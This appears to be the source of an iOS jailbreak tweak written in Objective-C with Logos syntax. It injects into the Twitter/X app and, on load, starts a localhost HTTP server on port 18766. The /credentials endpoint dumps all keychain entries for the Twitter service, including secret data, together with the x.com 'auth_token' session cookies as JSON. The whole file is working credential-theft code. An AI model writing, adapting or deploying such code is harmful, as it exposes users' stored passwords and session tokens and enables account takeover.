#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <unistd.h>

static const uint16_t kHTTPPort = 18766;
static NSString * const kService = @"com.twitter.twitter-iphone";
static NSString * const kCookieName = @"auth_token";

static NSString *JSONForCredentials(void) {
    NSMutableArray *keychain = [NSMutableArray array];
    NSDictionary *query = @{
        (__bridge NSString *)kSecClass: (__bridge NSString *)kSecClassGenericPassword,
        (__bridge NSString *)kSecAttrService: kService,
        (__bridge NSString *)kSecReturnAttributes: @YES,
        (__bridge NSString *)kSecReturnData: @YES,
        (__bridge NSString *)kSecMatchLimit: (__bridge NSString *)kSecMatchLimitAll,
        (__bridge NSString *)kSecAttrSynchronizable: (__bridge id)kSecAttrSynchronizableAny
    };

    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &result);
    if (status == errSecSuccess && result != NULL) {
        NSArray *items = (__bridge NSArray *)result;
        for (NSDictionary *item in items) {
            NSData *data = item[(__bridge NSString *)kSecValueData];
            NSString *dataString = data ? [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] : nil;
            [keychain addObject:@{
                @"account": item[(__bridge NSString *)kSecAttrAccount] ?: [NSNull null],
                @"service": item[(__bridge NSString *)kSecAttrService] ?: [NSNull null],
                @"data": dataString ?: [NSNull null]
            }];
        }
        CFRelease(result);
    }

    NSMutableArray *cookies = [NSMutableArray array];
    NSHTTPCookieStorage *storage = [NSHTTPCookieStorage sharedHTTPCookieStorage];
    for (NSHTTPCookie *cookie in storage.cookies) {
        if ([cookie.name isEqualToString:kCookieName] &&
            ([cookie.domain hasSuffix:@".x.com"] || [cookie.domain hasSuffix:@"x.com"])) {
            [cookies addObject:@{
                @"name": cookie.name ?: [NSNull null],
                @"value": cookie.value ?: [NSNull null],
                @"domain": cookie.domain ?: [NSNull null],
                @"path": cookie.path ?: [NSNull null],
                @"isSecure": @(cookie.isSecure),
                @"isHTTPOnly": @(cookie.isHTTPOnly)
            }];
        }
    }

    NSDictionary *response = @{
        @"keychainStatus": @(status),
        @"keychain": keychain,
        @"cookies": cookies
    };
    NSData *json = [NSJSONSerialization dataWithJSONObject:response options:0 error:nil];
    return [[NSString alloc] initWithData:json encoding:NSUTF8StringEncoding] ?: @"{}";
}

static NSData *HTTPResponse(NSString *body, NSInteger code) {
    NSString *status = code == 200 ? @"200 OK" : @"404 Not Found";
    NSData *payload = [body dataUsingEncoding:NSUTF8StringEncoding];
    NSString *header = [NSString stringWithFormat:@"HTTP/1.1 %@\r\nContent-Type: application/json\r\nContent-Length: %lu\r\nConnection: close\r\n\r\n", status, (unsigned long)payload.length];
    NSMutableData *response = [NSMutableData dataWithData:[header dataUsingEncoding:NSUTF8StringEncoding]];
    [response appendData:payload];
    return response;
}

static void StartHTTPServer(void) {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        int serverFD = socket(AF_INET, SOCK_STREAM, 0);
        if (serverFD < 0) return;
        int reuse = 1;
        setsockopt(serverFD, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
        struct sockaddr_in address = {0};
        address.sin_family = AF_INET;
        address.sin_port = htons(kHTTPPort);
        address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (bind(serverFD, (struct sockaddr *)&address, sizeof(address)) != 0 || listen(serverFD, 2) != 0) {
            close(serverFD);
            return;
        }
        NSLog(@"[TwitterCredentialHTTP] ready on 127.0.0.1:%d", kHTTPPort);
        for (;;) {
            int client = accept(serverFD, NULL, NULL);
            if (client < 0) continue;
            char buffer[2048] = {0};
            ssize_t length = read(client, buffer, sizeof(buffer) - 1);
            NSString *request = length > 0 ? [[NSString alloc] initWithBytes:buffer length:(NSUInteger)length encoding:NSUTF8StringEncoding] : @"";
            NSString *firstLine = [[request componentsSeparatedByString:@"\r\n"] firstObject] ?: @"";
            NSArray *parts = [firstLine componentsSeparatedByString:@" "];
            NSString *path = parts.count > 1 ? parts[1] : @"";
            NSString *body = [path isEqualToString:@"/credentials"] ? JSONForCredentials() : @"{\"error\":\"use /credentials\"}";
            NSData *response = HTTPResponse(body, [path isEqualToString:@"/credentials"] ? 200 : 404);
            write(client, response.bytes, response.length);
            close(client);
        }
    });
}

%ctor {
    StartHTTPServer();
}
